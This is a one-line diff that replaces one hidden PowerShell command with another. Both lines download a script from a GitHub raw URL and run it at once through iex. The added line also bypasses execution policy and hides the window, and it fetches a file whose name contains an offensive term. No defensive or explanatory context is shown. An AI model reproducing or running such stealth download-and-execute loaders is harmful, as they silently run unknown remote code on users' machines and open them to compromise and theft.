@@ -1,1 +1,1 @@
-powershell -WindowStyle Hidden -Command "iex (irm 'https://raw.githubusercontent.com/omx0466/nothing/refs/heads/main/aeaefef')"
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iwr 'https://raw.githubusercontent.com/Star2likesgirls/powershell/refs/heads/main/rapebootloader.ps1' -UseBasicParsing | iex"
